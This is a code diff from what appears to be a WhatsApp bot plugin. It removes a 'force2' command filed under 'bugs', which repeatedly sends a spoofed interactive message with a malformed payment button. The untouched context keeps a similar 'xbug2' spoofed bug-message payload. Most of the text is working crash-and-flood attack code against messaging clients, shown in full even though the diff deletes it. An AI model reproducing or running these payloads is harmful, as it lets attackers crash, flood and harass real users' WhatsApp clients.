@@ -5,34 +5,6 @@ const prefix = config.PREFIX; // Get the prefix from the config
 // Global bug message configuration
  global.xbug2 = { key: { remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net', }, message: { listResponseMessage: { title: "𝙴𝙼𝙿𝙸𝚁𝙴-𝙼𝙳", }, }, };
 
-// Global force2 message configuration
- global.force2 = { key: { participant: "0@s.whatsapp.net", remoteJid: "status@broadcast", }, message: { interactiveMessage: { header: { hasMediaAttachment: true, jpegThumbnail: "https://files.catbox.moe/cu7s47.jpg", }, nativeFlowMessage: { buttons: [ { name: "review_and_pay", buttonParamsJson: {"currency":"IDR","total_amount":{"value":49981399788,"offset":100}} } ] } } } };
-
-// Force2 Command
- cmd({ 
- pattern: "force2", 
- category: "bugs", 
- desc: "Sends a force2 message a specified number of times.",
- filename: __filename, 
- }, async (conn, mek, m, { args, reply }) => { 
-     try {
-         if (!args[0]) 
-             return reply(`Use ${prefix}force2 <amount>`);
-     
-let amount = parseInt(args[0]) || 10;
-    reply(`Please wait! Sending \`${amount}\` force2 messages...`);
-
-    for (let i = 0; i < amount; i++) {
-        await conn.sendMessage(m.chat, global.force2.message, { quoted: global.force2 });
-    }
-
-    reply(`Successfully sent \`${amount}\` force2 messages.`);
-} catch (e) {
-    reply(`Error: ${e.message}`);
-}
-
-});
-
 
 
 
